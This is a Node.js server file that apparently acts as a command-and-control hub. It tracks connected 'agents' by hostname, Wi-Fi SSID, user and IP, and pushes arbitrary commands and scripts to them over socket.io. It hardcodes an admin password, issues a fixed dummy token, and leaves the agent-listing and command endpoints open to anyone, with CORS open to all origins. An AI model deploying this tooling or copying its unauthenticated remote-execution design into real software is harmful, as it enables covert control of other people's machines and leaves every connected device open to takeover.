const express = require("express");
const http = require("http");
const socketio = require("socket.io");
const cors = require("cors");
const bodyParser = require("body-parser");

const app = express();
const server = http.createServer(app);
const io = socketio(server, {
  cors: { origin: "*" }
});

const PORT = 8000;
const ADMIN_PASSWORD = "1412SL";

app.use(cors());
app.use(bodyParser.json());

let agents = {}; // { agent_id: {socket, hostname, ssid, battery, platform, user, ip, online, lastSeen} }

function getAgentsBySSID(ssid) {
  return Object.values(agents).filter(a => a.ssid === ssid && a.online);
}
function getAllSSIDs() {
  let s = {};
  Object.values(agents).forEach(a => { if (a.ssid) s[a.ssid] = true; });
  return Object.keys(s);
}

io.of("/agent").on("connection", (socket) => {
  console.log("Agent connected:", socket.id);

  socket.on("message", (msgRaw) => {
    let msg;
    try { msg = JSON.parse(msgRaw); } catch { return; }
    if (msg.type === "status") {
      const data = msg.data;
      agents[data.agent_id] = {
        ...data,
        socket,
        online: true,
        lastSeen: Date.now()
      };
    } else if (msg.type === "ack") {
      // ack command
    }
  });

  socket.on("disconnect", () => {
    Object.values(agents).forEach(a => {
      if (a.socket === socket) a.online = false;
    });
    console.log("Agent disconnected");
  });
});

app.post("/login", (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    res.json({ ok: true, token: "dummy-token" });
  } else {
    res.status(401).json({ ok: false });
  }
});

app.get("/ssid", (req, res) => {
  res.json({ ssids: getAllSSIDs() });
});

app.get("/agents", (req, res) => {
  const { ssid } = req.query;
  let out = Object.values(agents)
    .filter(a => a.online)
    .map(a => ({
      agent_id: a.agent_id,
      hostname: a.hostname,
      ssid: a.ssid,
      battery: a.battery,
      platform: a.platform,
      user: a.user,
      ip: a.ip,
      lastSeen: a.lastSeen
    }));
  if (ssid) out = out.filter(a => a.ssid === ssid);
  res.json({ agents: out });
});

app.post("/command", (req, res) => {
  const { agent_ids, cmd, script } = req.body;
  if (!agent_ids || !cmd) return res.status(400).json({ error: "Missing params" });
  let ok = 0;
  agent_ids.forEach(id => {
    const agent = agents[id];
    if (agent && agent.online && agent.socket) {
      const payload = {
        type: "command",
        data: { cmd, script }
      };
      agent.socket.send(JSON.stringify(payload));
      ok++;
    }
  });
  res.json({ sent: ok });
});

server.listen(PORT, () => {
  console.log("Server listening:", PORT);
});